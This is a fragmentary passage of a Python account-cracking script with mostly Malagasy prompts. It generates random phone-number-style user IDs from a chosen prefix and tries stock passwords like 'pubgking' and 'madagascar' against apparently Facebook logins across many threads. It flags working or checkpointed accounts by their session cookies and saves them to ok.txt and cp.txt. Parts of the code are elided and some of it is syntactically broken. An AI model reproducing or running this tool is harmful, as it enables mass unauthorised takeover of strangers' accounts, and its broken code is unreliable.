...
def pubg():
	...
	print('[•] LIMIT [1000]')
	lines()
	limit = int(input('[•] LIMIT NAMPIDIRINAO :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		...
		print(logo)
		tl = str(len(user))
		print('[•] TOTALINY KAONTY    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] SAFIDIO METAODY : \033[1;32mPUBG
		lines()
		for guru in user:
			uid = kode+guru
			pwx = [guru,'pubgqueen','pubgking','pubglover']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Vita soamantsara fakanao kaonty')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	input('Press Enter To Go Back To Menu')
	SIAL-ZADA()
...
def ff():
	...
	os.system('clear')
	print(logo)
	print('[√] OHATRA :92318,92345,92323,92306.ETC')
	lines()
	kode = input('[+]\033[1;37m AMPIDIRO KAODY : ')
	os.system('clear')
	print(logo)
	print('[•] LIMIT [5000]')
	lines()
	limit = int(input('[•] LIMIT AMPIDIRINAO :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		...
		tl = str(len(user))
		print('[•] TOTALINY KAONTY   : \033[1;32m'+tl)
		print('\033[1;37m[•] SAFIDIO KAODY     : \033[1;32m'+kode)
		print('\033[1;37m[•] SAFIDIO METAODY : \033[1;32mFREE FIRE')
		lines()
		for guru in user:
			uid = kode+guru
...
def bd():
	...
	print('[•] OHATRA : 261**')
	lines()
	kode = input('[•]\033[1;37m AMPIDIRO KAODINAO : ')
	os.system('clear')
	print(logo)
	print('[•] LIMIT [1000]')
	lines()
	...
	with ThreadPool(max_workers=70) as yaari:
		...
		print('[•] TOTALINY KAONTY   : \033[1;32m'+tl)
		print('\033[1;37m[•] SAFIDIO KAODY     : \033[1;32m'+kode)
		print('\033[1;37m[•] SAFIDIO METAODY : \033[1;32mBANGLA')
		lines()
		for guru in user:
		     uid = kode+guru
		     pwx = [guru,'+261','madagascar']
		     yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Vita soamantsara fakanao kaonty')
	print('[?] Ids saved in ok.txt,cp.txt')
	input('Press Inter To Back Menu')
...
def fcrack(uid,pwx,tl):
    ...
    'user-agent':pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[RONNY-XD-KAONTY VELONA] '+cid+' | '+ps+'\x1b[1;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;33m[RONNY-XD-CHECKPOINT] '+uid+' | '+ps+'\x1b[1;97m')
